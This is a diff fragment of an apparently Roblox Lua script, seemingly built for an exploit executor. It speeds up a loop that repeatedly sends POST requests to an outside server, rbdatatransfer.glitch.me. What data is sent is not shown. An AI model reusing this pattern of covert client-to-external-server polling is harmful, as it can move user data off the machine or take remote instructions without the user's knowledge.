@@ -58,7 +58,7 @@ local function YNBKR_fake_script() -- Server.LocalScript
 				end
 			end)
 		end)
-		while wait(1) do
+		while wait(.3) do
 			local ResponseData = http_request({
 				Url = "https://rbdatatransfer.glitch.me",
 				Method = "POST",
